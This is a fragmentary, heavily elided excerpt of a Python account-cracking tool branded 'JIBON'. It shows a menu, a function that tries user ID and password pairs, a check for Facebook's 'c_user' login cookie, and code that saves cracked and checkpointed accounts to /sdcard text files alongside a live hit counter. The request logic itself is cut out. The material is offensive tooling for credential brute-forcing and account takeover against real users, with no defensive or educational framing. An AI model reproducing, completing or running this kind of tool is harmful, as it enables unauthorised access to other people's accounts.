...
def mumit_menu():
    ...
    print('\033[1;92m [E] EXIT TOOL')
    linex()
    mumit=input(' \033[1;32m[?] SELECT MENU: ')
    if mumit in['1','01']:JIBON()
...
def JIBON():
    ...
    print('Ok Ids Saved in /JIBON-OK.txt')
    print('Cp Ids Saved in /JIBON-CP.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[JIBON-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[JIBON-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/JIBON-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mJIBON\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
